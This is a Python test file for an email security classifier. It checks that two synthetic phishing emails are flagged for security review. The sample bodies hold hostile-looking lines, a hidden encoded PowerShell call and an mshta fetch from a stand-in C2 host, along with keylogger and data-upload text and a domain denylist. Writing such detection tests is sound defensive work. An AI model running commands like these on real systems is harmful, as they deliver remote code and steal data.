import os


def _set_env(monkeypatch):
    monkeypatch.setenv("FEATURE_FLAGS_PATH", "config/feature_flags.json")
    monkeypatch.setenv("DATABASE_URL", "sqlite:///./test_email_adv_patterns.db")
    monkeypatch.setenv("DATABASE_URL_RO", "sqlite:///./test_email_adv_patterns.db")
    monkeypatch.setenv("DECISION_LOG_WRITES_ENABLED", "1")


def _patch_thresholds(monkeypatch):
    thresholds = {
        "SECURITY_THRESHOLDS": {
            "BEC_WARN_INDICATORS": 2,
            "BEC_ERROR_INDICATORS": 3,
            "IOC_WARN_COUNT": 1,
            "IOC_ERROR_COUNT": 2,
            "DOMAIN_DENYLIST": ["evil-c2.example", "dropbox-bad.example"],
            "HASH_DENYLIST": ["deadbeef"],
            "TRUSTED_VENDOR_DOMAINS": ["supplier.com"],
            "INTERNAL_EMAIL_DOMAINS": ["shopsquire.ai"],
        },
        "TICKET_RATE_LIMIT": {"enabled": False, "per_min": 100},
    }

    import src.app.security.email_security as es
    import src.app.security.email_security_rules as rules
    import src.app.security.email_security_verdict as verdict

    monkeypatch.setattr(es, "load_feature_flags", lambda *_args, **_kwargs: thresholds)
    monkeypatch.setattr(rules, "load_feature_flags", lambda *_args, **_kwargs: thresholds)
    monkeypatch.setattr(verdict, "load_feature_flags", lambda *_args, **_kwargs: thresholds)


def test_ransomware_fileless_lolbin_combo_forces_security_review(monkeypatch):
    _set_env(monkeypatch)
    _patch_thresholds(monkeypatch)
    from src.app.security.email_security import evaluate_email_security

    out = evaluate_email_security(
        {
            "message_id": "<adv-ransom@x>",
            "from_addr": "Ops <ops@supplier.com>",
            "reply_to": "ops@supplier.com",
            "subject": "Immediate action required",
            "body": (
                "Your files are encrypted. Pay bitcoin within 24 hours for decryption key. "
                "Run powershell -w hidden -enc AAA and mshta https://evil-c2.example/a. "
                "Beacon to command and control callback server every 30 seconds."
            ),
            "attachments": [{"name": "invoice.lnk"}],
            "external_sender": True,
            "dmarc_fail": False,
        },
        tenant_id="t-email",
    )

    assert out["route"] == "security_review"
    assert out["verdict_action"] == "security_review"
    assert out["severity"] == "error"
    types = {str(i.get("type")) for i in (out.get("indicators") or [])}
    assert "ransomware_extortion_pattern" in types
    assert "fileless_execution_pattern" in types
    assert "c2_beacon_pattern" in types
    assert ("lolbin_delivery_combo" in types) or ("malware_delivery_combo" in types)


def test_data_exfil_and_keylogger_patterns_force_security_review(monkeypatch):
    _set_env(monkeypatch)
    _patch_thresholds(monkeypatch)
    from src.app.security.email_security import evaluate_email_security

    out = evaluate_email_security(
        {
            "message_id": "<adv-exfil@x>",
            "from_addr": "Finance <finance@supplier.com>",
            "reply_to": "finance@supplier.com",
            "subject": "Updated workbook",
            "body": (
                "Please open and enable macros. This keylogger captures passwords. "
                "Then export all customers and upload to dropbox-bad.example immediately."
            ),
            "attachments": [{"name": "payment_update.xlsm"}],
            "external_sender": True,
            "dmarc_fail": False,
        },
        tenant_id="t-email",
    )

    assert out["route"] == "security_review"
    assert out["severity"] == "error"
    types = {str(i.get("type")) for i in (out.get("indicators") or [])}
    assert "data_exfil_intent" in types
    assert "keylogger_pattern" in types
    assert "malware_delivery_combo" in types

